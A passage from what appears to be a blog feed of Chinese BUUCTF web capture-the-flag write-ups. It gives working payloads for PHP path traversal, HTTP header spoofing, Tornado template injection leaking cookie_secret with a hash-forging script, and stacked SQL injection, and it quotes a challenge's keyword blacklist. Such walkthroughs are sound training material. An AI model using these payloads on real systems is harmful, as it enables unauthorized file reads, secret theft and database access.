single-quoted-string">'的索引            );//截取'</span><span class="token operator">?</span><span class="token string single-quoted-string">'前面的字符            if (in_array($_page, $whitelist)) {//检查截取后是否在白名单                return true;            }            $_page = urldecode($page);//url解码            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '</span><span class="token operator">?</span><span class="token string single-quoted-string">', '</span><span class="token operator">?</span><span class="token string single-quoted-string">')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can'</span>t see it"<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析后得到函数功能  只需要满足一个ture就能进入包含文件</p><p>进入hint.php  得到提示flag not here, and flag in ffffllllaaaagggg</p><p>猜测是目录遍历</p><p>这里构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>source<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>hint<span class="token operator">.</span>php<span class="token operator">?</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg或者<span class="token operator">/</span>source<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>hint<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">253</span>F<span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>成功了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Http</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-http/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-http/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>检查源码，发现<code>Secret.php</code></p><p>进入<code>Secret.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">It doesn<span class="token string single-quoted-string">'t come from '</span>https<span class="token punctuation">:</span><span class="token comment">//www.Sycsecret.com'提示</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>burp抓包修改Referer</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Referer<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token comment">//www.Sycsecret.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">提示Please <span class="token keyword">use</span> <span class="token string double-quoted-string">"Syclover"</span> brows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改UA</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Syclover<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">提示No<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span> you can only read this locally<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改XFF</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Havefun</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-havefun/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-havefun/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>审查源代码得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string single-quoted-string">'dog'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Syc{cat_cat_cat_cat}'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入参数=dog</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>cat<span class="token operator">=</span>dog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网杯_2018 easy_tornado</title>
      <link href="/2021/03/01/hu-wang-bei-2018-easy-tornado/"/>
      <url>/2021/03/01/hu-wang-bei-2018-easy-tornado/</url>
      
        <content type="html"><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>进入三个文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>flag<span class="token operator">.</span>txtflag in <span class="token operator">/</span>fllllllllllllagfile<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>flag<span class="token operator">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span><span class="token number">9053</span>c61f6b76e014b1e003957ee5b546<span class="token operator">/</span>welcome<span class="token operator">.</span>txtrenderfile<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>welcome<span class="token operator">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span><span class="token number">7</span>d2c2069a844d7a93c2d6ee197618bd6<span class="token operator">/</span>hints<span class="token operator">.</span>txt<span class="token function">md5</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span><span class="token function">md5</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>hints<span class="token operator">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>b01fb2c2497da3d0979b7965d57a95dc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span><span class="token string backtick-quoted-string">`md5(cookie_secret+md5(/fllllllllllllag))`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在主要就是找<code>cookie_secret</code></p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用，从<code>render</code>可以猜测是模板注入</p><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloaderror<span class="token operator">?</span>msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler<span class="token operator">.</span>settings<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string single-quoted-string">'autoreload'</span><span class="token punctuation">:</span> <span class="token constant boolean">True</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'compiled_template_cache'</span><span class="token punctuation">:</span> <span class="token constant boolean">False</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cookie_secret'</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'591f8ab1-795d-4d61-9975-6da84c69a663'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用脚本跑得到filehash</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>cookie_secret<span class="token operator">=</span><span class="token string">"591f8ab1-795d-4d61-9975-6da84c69a663"</span><span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>610463dc2fc8906a2682dd82ca291cec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span><span class="token number">610463</span>dc2fc8906a2682dd82ca291cec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF_2019 EasySQL</title>
      <link href="/2021/03/01/suctf-2019-easysql/"/>
      <url>/2021/03/01/suctf-2019-easysql/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>打开源码得到</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此处post传参，参数名query</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">query<span class="token operator">=</span><span class="token number">11</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token number">11</span> <span class="token punctuation">)</span><span class="token comment">//回显点貌似只有一个</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这道waf过滤了太多关键词了，又想到堆叠注入</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">query<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>show databases<span class="token punctuation">;</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> ctf <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> ctftraining <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> information_schema <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> mysql <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> performance_schema <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> test <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">query<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>show tables<span class="token punctuation">;</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> Flag <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>猜测flag在Flag表里</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select "</span><span class="token operator">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"||flag from Flag"</span><span class="token punctuation">;</span><span class="token comment">//不知道哪儿来的源码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里就转为对||的处理</p><p>第一种直接用*查询全部</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadquery<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">//select *,1||flag from Flag  等效于select *,1 from Flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第二种 使用<code>set sql_mode=PIPES_AS_CONCAT;</code>将||视为字符串的连接操作符而非或运算符。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadquery<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>set sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span>select <span class="token number">1</span><span class="token comment">// '||' 前面是真就会跳过后面</span><span class="token comment">//select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag</span><span class="token comment">//1||flag合并成一个单位回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">global</span> <span class="token variable">$MysqlLink</span><span class="token punctuation">;</span>    <span class="token comment">//GetPara();</span>    <span class="token variable">$MysqlLink</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$datauser</span><span class="token punctuation">,</span><span class="token variable">$datapass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Mysql Connect Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$selectDB</span> <span class="token operator">=</span> <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$dataName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$selectDB</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Choose Database Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">//die();</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">&gt;</span></span> Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$BlackList</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span><span class="token punctuation">;</span>        <span class="token comment">//var_dump(preg_match("/{$BlackList}/is",$post['query']));</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$BlackList</span><span class="token punctuation">}</span></span>/is"</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//echo $post['query'];</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select "</span><span class="token operator">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"||flag from Flag"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>@<span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 EasySQL</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-easysql/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-easysql/</url>
      
